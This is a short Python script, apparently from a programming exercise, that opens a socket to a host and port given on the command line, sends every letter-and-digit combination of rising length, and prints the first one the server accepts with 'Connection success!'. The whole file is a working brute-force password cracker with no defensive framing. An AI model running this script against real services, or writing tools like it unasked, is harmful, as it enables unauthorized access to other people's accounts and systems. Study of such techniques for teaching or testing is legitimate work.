from itertools import product
import string
import socket
import sys

ip_address = sys.argv[1]
port = sys.argv[2]
letters_digits = string.ascii_letters + string.digits


def generate_messages(letters_digits):
    for i in range(1, len(letters_digits) + 1):
        my_generator = (message for message in product(letters_digits, repeat=i))
        yield from my_generator


class Socket:
    def __init__(self):
        self.sock = socket.socket()

    def connect(self, host, port):
        self.sock.connect((host, port))

    def send(self, message):
        self.sock.send(message.encode())

    def receive(self):
        return self.sock.recv(1024)

    def check_password(self):
        message_generator = generate_messages(letters_digits)

        for message in message_generator:
            self.sock.send(''.join(message).encode())
            if self.receive().decode('utf-8') == "Connection success!":
                return ''.join(message)

    def close_conn(self):
        self.sock.close()


def main():
    sock = Socket()
    sock.connect(ip_address, int(port))
    print(sock.check_password())
    sock.close_conn()


if __name__ == '__main__':
    main()
